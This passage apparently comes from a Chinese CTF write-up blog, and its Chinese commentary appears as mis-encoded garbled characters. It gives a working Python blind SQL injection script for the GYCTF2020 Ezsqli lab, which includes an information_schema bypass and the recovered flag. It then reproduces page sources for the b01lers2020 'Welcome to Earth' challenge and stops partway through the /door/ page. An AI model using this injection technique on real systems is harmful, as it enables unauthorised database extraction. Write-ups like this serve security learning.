title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>è‡ªå·±æµ‹è¯•å‘ç°å¯ä»¥ç›²æ³¨ ä½†æ˜¯è„šæœ¬ç»™å¡ä¸»äº†ï¼Œç¬¬ä¸€æ¬¡äº†è§£åˆ°information_schemaçš„æ›¿ä»£</p><p>information_schema =&gt;  <code>sys.schema_table_statistics</code> / <code>sys.x$schema_flattened_keys</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://www.cnblogs.com/h3ng/p/12904606.html  è„šæœ¬æ¥æº</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://14b858fa-e701-47da-a11a-304ef60eb42d.node3.buuoj.cn/&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_hex</span>(<span class="hljs-params">s</span>):</span> <span class="hljs-comment">#åå…­è¿›åˆ¶è½¬æ¢ fl ==&gt; 0x666c</span><br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        res += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    res = <span class="hljs-string">&#x27;0x&#x27;</span> + res<br>    <span class="hljs-keyword">return</span> res<br><br>res = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    left = <span class="hljs-number">31</span><br>    right = <span class="hljs-number">127</span><br>    mid = left + ((right - left)&gt;&gt;<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> left &lt; right:<br>        <span class="hljs-comment">#payload = &#x27;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i,mid) #çˆ†åº“</span><br>        <span class="hljs-comment">#payload = &#x27;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i,mid) #çˆ†è¡¨</span><br>        <span class="hljs-comment">#payload = &#x27;1^(ascii(substr((select group_concat(flag) from f1ag_1s_h3r3_hhhhh),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i,mid) #çŒœæµ‹f1ag_1s_h3r3_hhhhhä¸­çš„åˆ—åä¸ºflag</span><br>        key = (str_hex(res+<span class="hljs-built_in">chr</span>(mid)))<br>        payload = <span class="hljs-string">&quot;1 ^ ( (select 1,&#123;&#125;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="hljs-built_in">format</span>(key)<br>        data = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>:payload <br>            &#125;<br>        r = requests.post(url = url,  data = data)<br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">429</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;too fast&#x27;</span>)<br>            time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span>  <span class="hljs-keyword">in</span> r.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<br>            right = mid <br>        mid = left + ((right-left)&gt;&gt;<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> mid == <span class="hljs-number">31</span> <span class="hljs-keyword">or</span> mid == <span class="hljs-number">127</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#res += chr(mid) #çˆ†è¡¨</span><br>    res += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>) <span class="hljs-comment">#çˆ†flag</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(mid),res)<br><span class="hljs-comment">#give_grandpa_pa_pa_pa</span><br><span class="hljs-comment">#news,users,f1ag_1s_h3r3_hhhhh,users233333333333333</span><br><span class="hljs-comment">#flag&#123;8ebdb3ac-1d0e-47f3-82d5-ef5b4d20fe70&#125;</span><br></code></pre></td></tr></table></figure><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>é¡µé¢ä¸æ–­åˆ·æ–°</p><p>ç”¨curl è·å–æºç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to Earth<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>AMBUSH!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>You&#x27;ve gotta escape!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/img/f18.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;alien mothership&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:60vw;&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">      <span class="hljs-built_in">document</span>.onkeydown = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) </span>&#123;</span><br><span class="javascript">        event = event || <span class="hljs-built_in">window</span>.event;</span><br><span class="javascript">        <span class="hljs-keyword">if</span> (event.keyCode == <span class="hljs-number">27</span>) &#123;</span><br><span class="javascript">          event.preventDefault();</span><br><span class="javascript">          <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/chase/&quot;</span>;</span><br><span class="javascript">        &#125; <span class="hljs-keyword">else</span> die();</span><br><span class="javascript">      &#125;;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params">ms</span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dietimer</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">10000</span>);</span><br><span class="javascript">        die();</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">die</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/die/&quot;</span>;</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      dietimer();</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è‚¯å®šæ˜¯å¸Œæœ›è¿›åˆ°ç¨‹åº15è¡Œé‚£ä¸ªchaseé‡Œé¢ï¼Œå› æ­¤éœ€è¦æ»¡è¶³ event.keyCode==27ï¼Œä½†ç›´æ¥è®¿é—®ä¹Ÿæ˜¯å¯ä»¥å¾—</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to Earth<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>CHASE!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>      You managed to chase one of the enemy fighters, but there&#x27;s a wall coming<br>      up fast!<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;left()&quot;</span>&gt;</span>Left<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;right()&quot;</span>&gt;</span>Right<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span></span><br><span class="hljs-tag">      <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/img/Canyon_Chase_16.png&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;canyon chase&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:60vw;&quot;</span></span><br><span class="hljs-tag">    /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params">ms</span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dietimer</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">1000</span>);</span><br><span class="javascript">        die();</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">die</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/die/&quot;</span>;</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">left</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/die/&quot;</span>;</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leftt</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/leftt/&quot;</span>;</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">right</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/die/&quot;</span>;</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      dietimer();</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>  <span class="hljs-comment">&lt;!--å“ˆå“ˆå“ˆå“ˆ å·¦å³éƒ½æ˜¯æ­»è¿™æ˜¯æˆ‘è‡ªå·±æ‰“çš„--&gt;</span><br></code></pre></td></tr></table></figure><p>æ²¡å•¥æ€è·¯å°±ç»§ç»­çœ‹ï¼Œè®¿é—® /leftt/ æºç æç¤ºäº†ä¸€ä¸ªç›®å½• </p><p><code> &lt;!-- &lt;button onClick=&quot;window.location=&#39;/shoot/&#39;&quot;&gt;Take the shot&lt;/button&gt; --&gt;</code></p><p>åœ¨  /shoot/ä¸­çš„æºç åˆçœ‹åˆ°</p><p><code>&lt;button onClick=&quot;window.location=&#39;/door/&#39;&quot;&gt;Continue&lt;/button&gt;</code></p><p>è®¿é—® ./door/ å‘ç°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to Earth<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/door.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>YOU APPROACH THE ALIEN CRAFT!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>How do you get inside?<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/img/ship.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;crashed ship&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:60vw;&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;door_form&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span>0<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span>1<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2&quot;</span> /&gt;</span>2<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;3&quot;</span> /&gt;</span>3<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;4&quot;</span> /&gt;</span>4<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;5&quot;</span> /&gt;</span>5<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;6&quot;</span> /&gt;</span>6<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;7&quot;</span> /&gt;</span>7<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;8&quot;</span> /&gt;</span>8<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span 